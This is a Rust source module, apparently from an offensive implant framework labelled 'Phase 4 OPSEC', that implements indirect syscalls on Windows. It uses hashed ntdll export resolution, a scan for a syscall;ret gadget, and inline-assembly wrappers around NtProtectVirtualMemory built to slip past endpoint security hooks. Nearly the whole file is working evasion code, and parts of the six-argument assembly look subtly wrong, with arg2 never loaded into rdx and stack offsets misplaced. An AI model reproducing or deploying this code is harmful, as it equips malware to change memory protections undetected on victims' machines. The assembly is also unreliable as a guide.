//! Indirect syscalls — Phase 4 OPSEC
//!
//! Runtime syscall number resolution and indirect execution.
//! Detection rules: wiki/detection/yara/kraken_opsec.yar
//!
//! This module provides:
//! - Runtime syscall number resolution from ntdll exports
//! - Indirect syscall execution via gadgets in ntdll
//! - High-level wrappers for common Nt* functions

#[cfg(target_os = "windows")]
use std::collections::HashMap;
#[cfg(target_os = "windows")]
use std::sync::OnceLock;

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

/// Global syscall resolver - initialized once on first use
#[cfg(target_os = "windows")]
static SYSCALL_RESOLVER: OnceLock<SyscallResolver> = OnceLock::new();

/// Global syscall gadget address - initialized once on first use
#[cfg(target_os = "windows")]
static SYSCALL_GADGET: OnceLock<usize> = OnceLock::new();

/// Pre-computed hashes for common Nt functions
#[cfg(windows)]
pub mod hashes {
    /// Hash of "NtAllocateVirtualMemory"
    pub const NT_ALLOCATE_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtAllocateVirtualMemory");
    /// Hash of "NtProtectVirtualMemory"
    pub const NT_PROTECT_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtProtectVirtualMemory");
    /// Hash of "NtWriteVirtualMemory"
    pub const NT_WRITE_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtWriteVirtualMemory");
    /// Hash of "NtReadVirtualMemory"
    pub const NT_READ_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtReadVirtualMemory");
    /// Hash of "NtQuerySystemInformation"
    pub const NT_QUERY_SYSTEM_INFORMATION: u32 = djb2_hash_const(b"NtQuerySystemInformation");
    /// Hash of "NtClose"
    pub const NT_CLOSE: u32 = djb2_hash_const(b"NtClose");

    /// Compile-time DJB2 hash
    pub const fn djb2_hash_const(data: &[u8]) -> u32 {
        let mut hash: u32 = 5381;
        let mut i = 0;
        while i < data.len() {
            hash = hash.wrapping_mul(33).wrapping_add(data[i] as u32);
            i += 1;
        }
        hash
    }
}

/// Syscall number resolver
#[cfg(target_os = "windows")]
pub struct SyscallResolver {
    ntdll_base: *const u8,
    table: HashMap<u32, u16>,
}

// SAFETY: SyscallResolver contains a raw pointer to ntdll's base address.
// ntdll is a system DLL loaded at a fixed address for the lifetime of the
// process; this memory is never freed or moved, so sharing the pointer across
// threads is safe.
#[cfg(target_os = "windows")]
unsafe impl Send for SyscallResolver {}

#[cfg(target_os = "windows")]
unsafe impl Sync for SyscallResolver {}

#[cfg(target_os = "windows")]
impl SyscallResolver {
    pub unsafe fn new() -> Option<Self> {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 {
            return None;
        }

        let mut resolver = Self {
            ntdll_base: ntdll as *const u8,
            table: HashMap::new(),
        };
        resolver.build_table();
        Some(resolver)
    }

    unsafe fn build_table(&mut self) {
        // Parse ntdll export table to find Nt* functions
        let dos = self.ntdll_base as *const ImageDosHeader;
        let nt = self.ntdll_base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;

        let export_rva = (*nt).optional_header.data_directory[0].virtual_address;
        if export_rva == 0 { return; }

        let export = self.ntdll_base.add(export_rva as usize) as *const ImageExportDirectory;

        let names = std::slice::from_raw_parts(
            self.ntdll_base.add((*export).address_of_names as usize) as *const u32,
            (*export).number_of_names as usize,
        );
        let ordinals = std::slice::from_raw_parts(
            self.ntdll_base.add((*export).address_of_name_ordinals as usize) as *const u16,
            (*export).number_of_names as usize,
        );
        let functions = std::slice::from_raw_parts(
            self.ntdll_base.add((*export).address_of_functions as usize) as *const u32,
            (*export).number_of_functions as usize,
        );

        for i in 0..(*export).number_of_names as usize {
            let name_ptr = self.ntdll_base.add(names[i] as usize);
            if let Ok(name) = std::ffi::CStr::from_ptr(name_ptr as *const i8).to_str() {
                if name.starts_with("Nt") || name.starts_with("Zw") {
                    let func_rva = functions[ordinals[i] as usize];
                    let func = self.ntdll_base.add(func_rva as usize);

                    if let Some(num) = extract_syscall_number(func) {
                        self.table.insert(djb2_hash(name.as_bytes()), num);
                    }
                }
            }
        }
    }

    pub fn get_number(&self, func_hash: u32) -> Option<u16> {
        self.table.get(&func_hash).copied()
    }

    /// Get the ntdll base address
    pub fn ntdll_base(&self) -> *const u8 {
        self.ntdll_base
    }
}

/// Initialize the global syscall resolver and gadget
/// Returns true if initialization succeeded
#[cfg(target_os = "windows")]
pub fn init_syscalls() -> bool {
    unsafe {
        let resolver = SYSCALL_RESOLVER.get_or_init(|| {
            SyscallResolver::new().unwrap_or(SyscallResolver {
                ntdll_base: std::ptr::null(),
                table: HashMap::new(),
            })
        });

        if resolver.ntdll_base.is_null() {
            return false;
        }

        SYSCALL_GADGET.get_or_init(|| {
            find_syscall_gadget(resolver.ntdll_base).unwrap_or(0)
        });

        SYSCALL_GADGET.get().map_or(false, |&g| g != 0)
    }
}

/// Get a syscall number by function name hash
#[cfg(target_os = "windows")]
pub fn get_syscall_number(func_hash: u32) -> Option<u16> {
    SYSCALL_RESOLVER.get()?.get_number(func_hash)
}

/// Get the syscall gadget address
#[cfg(target_os = "windows")]
pub fn get_syscall_gadget() -> Option<usize> {
    SYSCALL_GADGET.get().copied()
}

/// Find a syscall;ret gadget in ntdll's .text section
/// Returns the address of the gadget (syscall instruction)
#[cfg(target_os = "windows")]
unsafe fn find_syscall_gadget(ntdll_base: *const u8) -> Option<usize> {
    if ntdll_base.is_null() {
        return None;
    }

    // Parse PE headers
    let dos = ntdll_base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D {
        return None;
    }

    let nt = ntdll_base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x00004550 {
        return None;
    }

    // Get section headers (immediately after optional header)
    let optional_header_size = (*nt).file_header.size_of_optional_header as usize;
    let sections_start = (nt as *const u8)
        .add(4) // signature
        .add(20) // file header
        .add(optional_header_size);
    let num_sections = (*nt).file_header.number_of_sections as usize;

    let sections = std::slice::from_raw_parts(
        sections_start as *const ImageSectionHeader,
        num_sections,
    );

    // Find .text section and search for syscall;ret pattern
    for section in sections {
        // Check if section name starts with ".text"
        if section.name[0] == b'.' && section.name[1] == b't' {
            let section_start = ntdll_base.add(section.virtual_address as usize);
            let section_size = section.virtual_size as usize;

            // Search for syscall;ret pattern: 0F 05 C3
            for offset in 0..(section_size.saturating_sub(3)) {
                let ptr = section_start.add(offset);
                let bytes = std::slice::from_raw_parts(ptr, 3);

                // syscall (0F 05) followed by ret (C3)
                if bytes[0] == 0x0F && bytes[1] == 0x05 && bytes[2] == 0xC3 {
                    return Some(ptr as usize);
                }
            }
        }
    }

    None
}

#[cfg(target_os = "windows")]
unsafe fn extract_syscall_number(func: *const u8) -> Option<u16> {
    // Pattern: 4C 8B D1 B8 XX XX 00 00 (mov r10, rcx; mov eax, <num>)
    let bytes = std::slice::from_raw_parts(func, 8);
    if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
        return Some(u16::from_le_bytes([bytes[4], bytes[5]]));
    }
    None
}

/// DJB2 hash function
#[cfg(any(windows, test))]
pub fn djb2_hash(data: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &byte in data {
        hash = hash.wrapping_mul(33).wrapping_add(byte as u32);
    }
    hash
}

// PE structures
#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageOptionalHeader64 {
    _header: [u8; 112],
    data_directory: [ImageDataDirectory; 16],
}

#[cfg(target_os = "windows")]
#[repr(C)]
#[derive(Clone, Copy)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _pointer_to_relocations: u32,
    _pointer_to_linenumbers: u32,
    _number_of_relocations: u16,
    _number_of_linenumbers: u16,
    _characteristics: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageExportDirectory {
    _characteristics: [u8; 12],
    _name: u32,
    _base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

// =============================================================================
// Indirect Syscall Execution
// =============================================================================

/// Execute a syscall indirectly by jumping to a gadget in ntdll (4-arg variant)
///
/// This function sets up the registers for a Windows x64 syscall and jumps
/// to a syscall;ret gadget in ntdll.dll, avoiding direct syscall instructions
/// in our code.
///
/// # Safety
/// - Caller must ensure syscall_number is valid
/// - Caller must ensure gadget_addr points to a valid syscall;ret sequence
/// - Arguments must be valid for the specific syscall being invoked
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn indirect_syscall_4(
    syscall_number: u32,
    gadget_addr: usize,
    arg1: usize,
    arg2: usize,
) -> i32 {
    let result: i32;
    core::arch::asm!(
        "mov eax, {sysnum:e}",
        "mov r10, {arg1}",
        "mov rdx, {arg2}",
        "call {gadget}",
        sysnum  = in(reg) syscall_number,
        gadget  = in(reg) gadget_addr,
        arg1    = in(reg) arg1,
        arg2    = in(reg) arg2,
        out("rax") result,
        out("r10") _,
        out("rcx") _,
        out("r11") _,
        clobber_abi("C"),
    );
    result
}

/// Execute a syscall with up to 6 arguments via a gadget in ntdll (raw 4-register entry point)
///
/// # Safety
/// - Caller must ensure syscall_number is valid
/// - Caller must ensure gadget_addr points to a valid syscall;ret sequence
/// - Arguments must be valid for the specific syscall being invoked
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn indirect_syscall_6_raw(
    syscall_number: u32,
    gadget_addr: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> i32 {
    let result: i32;
    core::arch::asm!(
        "mov eax, {sysnum:e}",
        "mov r10, {arg1}",
        "mov rdx, {arg2}",
        "mov r8,  {arg3}",
        "mov r9,  {arg4}",
        "call {gadget}",
        sysnum  = in(reg) syscall_number,
        gadget  = in(reg) gadget_addr,
        arg1    = in(reg) arg1,
        arg2    = in(reg) arg2,
        arg3    = in(reg) arg3,
        arg4    = in(reg) arg4,
        out("rax") result,
        out("r10") _,
        out("rcx") _,
        out("r11") _,
        clobber_abi("C"),
    );
    result
}

// =============================================================================
// High-Level Syscall Wrappers
// =============================================================================

/// NtProtectVirtualMemory - Change memory protection
///
/// # Safety
/// All pointer arguments must be valid
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn nt_protect_virtual_memory(
    process_handle: isize,
    base_address: *mut *mut core::ffi::c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    let syscall_num = match get_syscall_number(hashes::NT_PROTECT_VIRTUAL_MEMORY) {
        Some(n) => n as u32,
        None => return -1, // STATUS_UNSUCCESSFUL
    };

    let gadget = match get_syscall_gadget() {
        Some(g) => g,
        None => return -1,
    };

    // NtProtectVirtualMemory has 5 args
    // We'll use indirect_syscall_6 format but only use 5
    indirect_syscall_6(
        syscall_num,
        gadget,
        process_handle as usize,
        base_address as usize,
        region_size as usize,
        new_protect as usize,
        old_protect as usize,
        0, // unused
    )
}

/// Wrapper to call indirect_syscall_6 with explicit stack args
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline(never)]
unsafe fn indirect_syscall_6(
    syscall_number: u32,
    gadget_addr: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    arg5: usize,
    arg6: usize,
) -> i32 {
    // Use a function call to set up stack properly
    type SyscallFn = unsafe extern "C" fn(u32, usize, usize, usize, usize, usize, usize, usize) -> i32;

    // For simplicity, we'll use a direct approach with inline asm
    let result: i32;
    core::arch::asm!(
        // Set up shadow space and args on stack
        "sub rsp, 0x58",          // shadow space + extra args
        "mov [rsp+0x48], {arg6}", // arg6
        "mov [rsp+0x40], {arg5}", // arg5
        "mov [rsp+0x38], {arg4}", // arg4
        "mov [rsp+0x30], {arg3}", // arg3
        // First 4 args in registers
        "mov r9, {arg2}",
        "mov r8, {arg1}",
        "mov rdx, {gadget}",
        "mov ecx, {sysnum:e}",
        // Set up syscall: eax = number, r10 = arg1, rdx = arg2, etc.
        "mov eax, ecx",
        "mov r10, r8",
        "mov r8, [rsp+0x30]",
        "mov r9, [rsp+0x38]",
        // Jump to gadget
        "call rdx",
        "add rsp, 0x58",
        sysnum = in(reg) syscall_number,
        gadget = in(reg) gadget_addr,
        arg1 = in(reg) arg1,
        arg2 = in(reg) arg2,
        arg3 = in(reg) arg3,
        arg4 = in(reg) arg4,
        arg5 = in(reg) arg5,
        arg6 = in(reg) arg6,
        out("rax") result,
        out("rcx") _,
        out("rdx") _,
        out("r8") _,
        out("r9") _,
        out("r10") _,
        out("r11") _,
        clobber_abi("C"),
    );
    result
}

// =============================================================================
// Non-Windows stubs
// =============================================================================

#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub struct SyscallResolver;

#[cfg(not(target_os = "windows"))]
impl SyscallResolver {
    #[allow(dead_code)]
    pub fn new() -> Option<Self> { None }
    #[allow(dead_code)]
    pub fn get_number(&self, _: u32) -> Option<u16> { None }
}

#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub fn init_syscalls() -> bool { false }

#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub fn get_syscall_number(_func_hash: u32) -> Option<u16> { None }

#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub fn get_syscall_gadget() -> Option<usize> { None }

#[cfg(not(target_os = "windows"))]
/// # Safety
///
/// Caller must ensure all pointer arguments are valid and properly aligned.
#[allow(dead_code)]
pub unsafe fn nt_protect_virtual_memory(
    _process_handle: isize,
    _base_address: *mut *mut core::ffi::c_void,
    _region_size: *mut usize,
    _new_protect: u32,
    _old_protect: *mut u32,
) -> i32 {
    -1 // Not supported
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_djb2_hash_empty() {
        assert_eq!(djb2_hash(b""), 5381);
    }

    #[test]
    fn test_djb2_hash_known_values() {
        // DJB2 hash of "NtAllocateVirtualMemory" should be consistent
        let hash1 = djb2_hash(b"NtAllocateVirtualMemory");
        let hash2 = djb2_hash(b"NtAllocateVirtualMemory");
        assert_eq!(hash1, hash2);

        // Different strings should produce different hashes
        let hash3 = djb2_hash(b"NtWriteVirtualMemory");
        assert_ne!(hash1, hash3);
    }

    #[test]
    fn test_djb2_hash_deterministic() {
        // Same input always produces same output
        for _ in 0..100 {
            assert_eq!(djb2_hash(b"test"), djb2_hash(b"test"));
        }
    }

    #[test]
    fn test_djb2_hash_single_char() {
        // hash = 5381 * 33 + 'a'
        let hash = djb2_hash(b"a");
        assert_eq!(hash, 5381u32.wrapping_mul(33).wrapping_add(b'a' as u32));
    }

    #[test]
    #[cfg(windows)]
    fn test_djb2_hash_const_matches_runtime() {
        // Verify compile-time and runtime hashes match
        assert_eq!(
            hashes::djb2_hash_const(b"NtAllocateVirtualMemory"),
            djb2_hash(b"NtAllocateVirtualMemory")
        );
        assert_eq!(
            hashes::djb2_hash_const(b"NtProtectVirtualMemory"),
            djb2_hash(b"NtProtectVirtualMemory")
        );
    }

    #[test]
    fn test_precomputed_hashes_unique() {
        // All precomputed hashes should be unique
        let hashes = [
            hashes::NT_ALLOCATE_VIRTUAL_MEMORY,
            hashes::NT_PROTECT_VIRTUAL_MEMORY,
            hashes::NT_WRITE_VIRTUAL_MEMORY,
            hashes::NT_READ_VIRTUAL_MEMORY,
            hashes::NT_QUERY_SYSTEM_INFORMATION,
            hashes::NT_CLOSE,
        ];

        for i in 0..hashes.len() {
            for j in (i + 1)..hashes.len() {
                assert_ne!(hashes[i], hashes[j], "Hash collision at {} and {}", i, j);
            }
        }
    }

    #[test]
    fn test_syscall_resolver_non_windows() {
        // On non-Windows, SyscallResolver::new() returns None
        let resolver = SyscallResolver::new();
        assert!(resolver.is_none());
    }

    #[test]
    fn test_init_syscalls_non_windows() {
        // On non-Windows, init_syscalls returns false
        assert!(!init_syscalls());
    }

    #[test]
    fn test_get_syscall_number_non_windows() {
        // On non-Windows, get_syscall_number returns None
        assert!(get_syscall_number(hashes::NT_CLOSE).is_none());
    }

    #[test]
    fn test_get_syscall_gadget_non_windows() {
        // On non-Windows, get_syscall_gadget returns None
        assert!(get_syscall_gadget().is_none());
    }

    #[test]
    fn test_nt_protect_virtual_memory_non_windows() {
        // On non-Windows, wrapper returns -1
        unsafe {
            let result = nt_protect_virtual_memory(
                0,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            );
            assert_eq!(result, -1);
        }
    }

    // Windows-specific tests
    #[test]
    #[cfg(target_os = "windows")]
    fn test_syscall_resolver_finds_nt_functions() {
        unsafe {
            if let Some(resolver) = SyscallResolver::new() {
                // Should find NtClose (it exists on all Windows versions)
                let nt_close = resolver.get_number(hashes::NT_CLOSE);
                assert!(nt_close.is_some(), "Should find NtClose syscall number");

                // Syscall numbers should be reasonable (< 0x1000 on most systems)
                if let Some(num) = nt_close {
                    assert!(num < 0x1000, "Syscall number {} seems too high", num);
                }
            }
        }
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn test_find_syscall_gadget_in_ntdll() {
        unsafe {
            if let Some(resolver) = SyscallResolver::new() {
                let gadget = find_syscall_gadget(resolver.ntdll_base());
                assert!(gadget.is_some(), "Should find syscall gadget in ntdll");

                // Verify the gadget contains syscall;ret
                if let Some(addr) = gadget {
                    let bytes = std::slice::from_raw_parts(addr as *const u8, 3);
                    assert_eq!(bytes[0], 0x0F, "First byte should be 0x0F");
                    assert_eq!(bytes[1], 0x05, "Second byte should be 0x05 (syscall)");
                    assert_eq!(bytes[2], 0xC3, "Third byte should be 0xC3 (ret)");
                }
            }
        }
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn test_init_syscalls_succeeds() {
        let result = init_syscalls();
        assert!(result, "init_syscalls should succeed on Windows");

        // After init, should be able to get syscall numbers
        let num = get_syscall_number(hashes::NT_CLOSE);
        assert!(num.is_some(), "Should get NtClose number after init");

        // And gadget address
        let gadget = get_syscall_gadget();
        assert!(gadget.is_some(), "Should get gadget after init");
    }
}
